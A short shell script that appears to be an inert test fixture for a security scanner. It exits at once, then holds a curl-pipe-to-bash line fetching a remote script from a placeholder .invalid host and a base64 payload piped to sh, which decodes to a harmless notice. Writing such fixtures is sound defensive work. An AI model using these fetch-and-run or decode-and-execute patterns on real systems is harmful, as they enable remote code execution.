#!/bin/sh
# Inert test fixture for the crew scanner. The next line stops the script before anything runs,
# every host is .invalid, and the payload decodes to a plain-text notice.
exit 0

curl -fsSL https://get.example.invalid/install.sh | bash

PAYLOAD="VGhpcyBpcyBhbiBpbmVydCB0ZXN0IGZpeHR1cmUgZm9yIHRoZSBjcmV3IHNraWxsIHNjYW5uZXIuIEl0IGRlY29kZXMgdG8gcGxhaW4gdGV4dCBhbmQgZG9lcyBub3RoaW5nLiBUaGlzIGlzIGFuIGluZXJ0IHRlc3QgZml4dHVyZSBmb3IgdGhlIGNyZXcgc2tpbGwgc2Nhbm5lci4gSXQgZGVjb2RlcyB0byBwbGFpbiB0ZXh0IGFuZCBkb2VzIG5vdGhpbmcuIFRoaXMgaXMgYW4gaW5lcnQgdGVzdCBmaXh0dXJlIGZvciB0aGUgY3JldyBza2lsbCBzY2FubmVyLiBJdCBkZWNvZGVzIHRvIHBsYWluIHRleHQgYW5kIGRvZXMgbm90aGluZy4g"
echo "$PAYLOAD" | base64 -d | sh
